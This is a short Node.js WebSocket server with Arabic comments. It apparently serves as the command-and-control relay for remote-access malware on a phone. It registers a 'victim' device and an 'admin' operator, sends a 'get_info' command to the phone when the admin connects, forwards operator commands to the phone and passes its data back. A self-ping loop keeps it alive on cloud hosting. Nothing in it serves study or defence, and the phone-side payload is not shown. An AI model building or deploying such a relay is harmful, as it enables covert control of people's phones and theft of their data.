const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

// تحديد المنفذ تلقائياً للسيرفرات السحابية أو 8080 محلياً
const PORT = process.env.PORT || 8080;

const server = http.createServer((req, res) => {
    // إرسال ملف لوحة التحكم
    fs.readFile(path.join(__dirname, 'dashboard.html'), (err, data) => {
        if (err) {
            res.writeHead(500);
            return res.end('Error loading dashboard.html');
        }
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(data);
    });
});

const wss = new WebSocket.Server({ server });
let victim = null, admin = null;

wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const msg = JSON.parse(message);
            
            // التعامل مع تسجيل دخول الضحية (الهاتف)
            if (msg.type === 'login') { 
                victim = ws; 
                console.log("🟢 Victim Connected: " + (msg.model || "Unknown"));
                if (admin) admin.send(JSON.stringify(msg));
            }
            
            // التعامل مع تسجيل دخول المسؤول (أنت)
            if (msg.type === 'login_admin') { 
                admin = ws; 
                console.log("👤 Admin Logged In");
                if (victim) victim.send(JSON.stringify({type: 'command', command: 'get_info'}));
            }
            
            // توجيه الأوامر من المسؤول للضحية
            if (msg.type === 'command' && victim) {
                victim.send(JSON.stringify(msg));
            }
            
            // توجيه البيانات من الضحية للمسؤول
            if (msg.type === 'data' && admin) {
                admin.send(JSON.stringify(msg));
            }

            // الاستجابة لـ Ping الحفاظ على الاتصال
            if (msg.type === 'ping') {
                ws.send(JSON.stringify({type: 'pong'}));
            }
            
        } catch (e) {
            console.error("Error parsing JSON:", e);
        }
    });

    ws.on('close', () => { 
        if (ws === victim) { victim = null; console.log("🔴 Victim Disconnected"); }
        if (ws === admin) { admin = null; console.log("👤 Admin Logged Out"); }
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// نظام الحفاظ على استيقاظ السيرفر (Self-Ping)
const axios = require('axios');
const SERVER_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

setInterval(() => {
    axios.get(SERVER_URL)
        .then(() => console.log('Self-ping success'))
        .catch(err => console.log('Self-ping failed (Server starting up?)'));
}, 600000); // كل 10 دقائق

